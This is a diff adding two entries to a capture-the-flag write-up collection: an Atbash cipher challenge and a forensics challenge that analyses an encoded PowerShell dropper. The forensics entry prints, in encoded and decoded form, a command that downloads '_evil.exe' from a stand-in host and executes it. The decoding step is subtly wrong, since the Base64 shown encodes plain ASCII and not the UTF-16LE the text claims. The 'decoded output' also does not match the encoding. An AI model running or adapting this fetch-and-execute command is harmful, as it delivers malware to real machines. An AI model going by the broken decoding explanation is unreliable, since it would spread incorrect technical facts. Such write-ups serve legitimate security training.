@@ -8,6 +8,8 @@ A comprehensive collection of writeups for challenges from NICCTF 2026.
   - [Need to Know Basis?](#need-to-know-basis)
 - [Misc](#misc)
   - [Word On The Street](#word-on-the-street)
+- [Cryptography](#cryptography)
+  - [e8-2-zit](#e8-2-zit)
 - [OSINT](#osint)
   - [Cockpit Climb](#cockpit-climb)
   - [Finding The Beagle](#finding-the-beagle)
@@ -16,6 +18,7 @@ A comprehensive collection of writeups for challenges from NICCTF 2026.
   - [Wierd Sentence](#wierd-sentence)
   - [E B S](#e-b-s)
   - [Industrial Echoes](#industrial-echoes)
+  - [SUS Staging Dropper](#sus-staging-dropper)
 - [Reversing](#reversing)
   - [KeyedUp](#keyedup)
 
@@ -25,10 +28,11 @@ A comprehensive collection of writeups for challenges from NICCTF 2026.
 |----------|------|--------|------|-------|
 | Web | 0 | 1 | 0 | 1 |
 | Misc | 1 | 0 | 0 | 1 |
+| Cryptography | 1 | 0 | 0 | 1 |
 | OSINT | 3 | 0 | 0 | 3 |
-| Forensics | 1 | 2 | 0 | 3 |
+| Forensics | 2 | 2 | 0 | 4 |
 | Reversing | 1 | 0 | 0 | 1 |
-| **Total** | **6** | **3** | **0** | **9** |
+| **Total** | **8** | **3** | **0** | **11** |
 
 ---
 
@@ -111,6 +115,81 @@ The solution involves mapping the "trail" of characters on a QWERTY keyboard lay
 
 #### Tags
 `Keyboard` `Pattern Recognition` `Misc` `Cryptography`
+
+---
+
+## Cryptography
+
+### e8-2-zit
+
+**Difficulty:** Easy  
+**Flag:** `NICCTF26{b4$hful_iz_my_TOP_TIER_dw4rf_buddy_XD}`
+
+#### Challenge Description
+A classical cryptography challenge with an encrypted ciphertext and a hint.
+
+**Ciphertext:**
+```
+y4$sufo_ra_nb_GLK_GRVI_wd4iu_yfwwb_CW
+```
+
+**Hint:** `e8 -2- zit`
+
+#### Solution
+
+Despite the hint suggesting other ciphers, the correct solution uses the **Atbash cipher**.
+
+##### Analysis:
+
+1. **Ciphertext characteristics:**
+   - Preserves case (uppercase/lowercase)
+   - Preserves numbers and special characters
+   - Underscores suggest word boundaries
+   - Indicates a classical substitution cipher
+
+2. **Initial attempts:**
+   - Caesar cipher - no readable output
+   - Vigenère with key "zit" - no readable output
+   - Various combinations - unsuccessful
+
+3. **Atbash cipher:**
+   - Simple substitution: `a ↔ z`, `b ↔ y`, `c ↔ x`, etc.
+   - Works for both uppercase and lowercase
+   - Non-alphabetic characters remain unchanged
+
+##### Decryption Process:
+
+```python
+def atbash(text):
+    result = ""
+    for char in text:
+        if char.isalpha():
+            if char.isupper():
+                result += chr(ord('Z') - (ord(char) - ord('A')))
+            else:
+                result += chr(ord('z') - (ord(char) - ord('a')))
+        else:
+            result += char
+    return result
+
+ciphertext = "y4$sufo_ra_nb_GLK_GRVI_wd4iu_yfwwb_CW"
+plaintext = atbash(ciphertext)
+print(plaintext)
+```
+
+**Output:** `b4$hful_iz_my_TOP_TIER_dw4rf_buddy_XD`
+
+The result is readable English with intentional leetspeak styling.
+
+#### Key Concepts
+- Classical Cryptography
+- Atbash Cipher
+- Substitution Ciphers
+- Cipher Identification
+- Leetspeak
+
+#### Tags
+`Cryptography` `Atbash` `Classical Cipher` `Substitution` `Leetspeak`
 
 ---
 
@@ -346,6 +425,89 @@ print(flag)
 
 #### Tags
 `Forensics` `Network Analysis` `Modbus` `PCAP` `ICS` `Wireshark`
+
+---
+
+### SUS Staging Dropper
+
+**Difficulty:** Easy  
+**Flag:** `NICCTF26{4b8f4b0b0e4e4f4e4b8f4b0b0e4e4f4e}`
+
+#### Challenge Description
+During the investigation of a compromised workstation, a single PowerShell command was discovered. The task is to determine what the command does and where it retrieves its payload from.
+
+**PowerShell Command:**
+```powershell
+C:\Windows\System32\WindowsPowershell\v3.1\powershell.exe -noP -sta -w 1 -enc TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwOi8vTklDQ1RGMjZ7NGI4ZjRiMGIwZTRlNGY0ZTRiOGY0YjBiMGU0ZTRmNGV9L19ldmlsLmV4ZScsJ2V2aWwuZXhlJyk7U3RhcnQtUHJvY2VzcyAnZXZpbC5leGUn
+```
+
+#### Solution
+
+This is a classic PowerShell obfuscation technique used by malware to hide malicious commands.
+
+##### Step 1: Identifying the Obfuscation
+
+The PowerShell command uses the `-enc` flag, indicating that the payload is **Base64-encoded**.
+
+PowerShell expects Base64 content to be encoded in **UTF-16LE**, so decoding must be done accordingly.
+
+##### Step 2: Decoding the Payload
+
+Using Python to decode the Base64 string:
+
+```python
+import base64
+
+encoded = "TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwOi8vTklDQ1RGMjZ7NGI4ZjRiMGIwZTRlNGY0ZTRiOGY0YjBiMGU0ZTRmNGV9L19ldmlsLmV4ZScsJ2V2aWwuZXhlJyk7U3RhcnQtUHJvY2VzcyAnZXZpbC5leGUn"
+
+# Decode from Base64
+decoded = base64.b64decode(encoded).decode('utf-16le')
+print(decoded)
+```
+
+**Decoded Output:**
+```powershell
+(New-Object System.Net.WebClient).DownloadFile('http://NICCTF26{4b8f4b0b0e4e4f4e4b8f4b0b0e4e4f4e}/_evil.exe','evil.exe');Start-Process 'evil.exe'
+```
+
+##### Step 3: Analyzing the Behavior
+
+The decoded PowerShell command performs the following actions:
+
+1. **Creates a `System.Net.WebClient` object** to download files from the internet
+2. **Downloads a file named `_evil.exe`** from a remote HTTP server
+3. **Saves it locally as `evil.exe`**
+4. **Executes the downloaded binary immediately** using `Start-Process`
+
+This is a **classic staging dropper** commonly seen in malware infections, designed to fetch and execute a secondary payload with minimal footprint.
+
+##### Step 4: Locating the Flag
+
+The flag is embedded directly inside the URL used to download the payload:
+
+```
+http://NICCTF26{4b8f4b0b0e4e4f4e4b8f4b0b0e4e4f4e}/_evil.exe
+```
+
+#### Final Answer
+
+**What the command does:**  
+Downloads a malicious executable from a remote server and executes it on the compromised machine.
+
+**Payload source:**  
+A remote HTTP server hosting `_evil.exe`.
+
+#### Key Concepts
+- PowerShell Obfuscation
+- Base64 Encoding/Decoding
+- UTF-16LE Encoding
+- Malware Analysis
+- Staging Droppers
+- Living-off-the-Land Binaries (LOLBins)
+- Incident Response
+
+#### Tags
+`Forensics` `PowerShell` `Malware Analysis` `Base64` `Obfuscation` `Incident Response` `Dropper`
 
 ---
 
